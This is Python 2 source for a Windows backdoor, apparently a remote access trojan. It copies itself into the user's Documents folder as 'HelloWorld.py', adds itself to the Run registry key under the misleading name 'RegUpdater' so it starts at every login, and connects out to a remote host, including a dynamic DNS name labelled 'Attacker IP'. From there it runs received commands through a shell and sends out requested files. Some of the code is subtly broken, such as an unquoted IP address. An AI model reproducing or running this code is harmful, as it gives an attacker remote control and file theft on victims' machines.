import socket 
import subprocess 
import os
import time
import shutil
import _winreg as wreg

path = os.getcwd().strip('\n')

Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' +'HelloWorld.py'

if not os.path.exists(destination):
    shutil.copyfile(path+'\HelloWorld.py', destination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run',0,
                       wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()
    

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: 
        s.send('Unable to find the file')

import random

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((10.186.6.186, 8080))
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            return 1 

        elif 'grab' in command:            
            grab,path = command.split('*')
            
            try:           
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  
                pass

        elif 'cd ' in command:
            code,directory = command.split (' ')
            os.chdir(directory)
            s.send ('[+] Current Directory is ' + os.getcwd() )
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  )

    time.sleep(3)

while True:

    try:
        if connect() == 1:
            break

    except:
        sleep_for = random.randrange(1,10)
        time.sleep(sleep_for*60)
        pass

def main ():
    ip = socket.gethostbyname('raven12.ddns.net')
    print 'Attacker IP is: ' + ip
    connect(ip)
main()




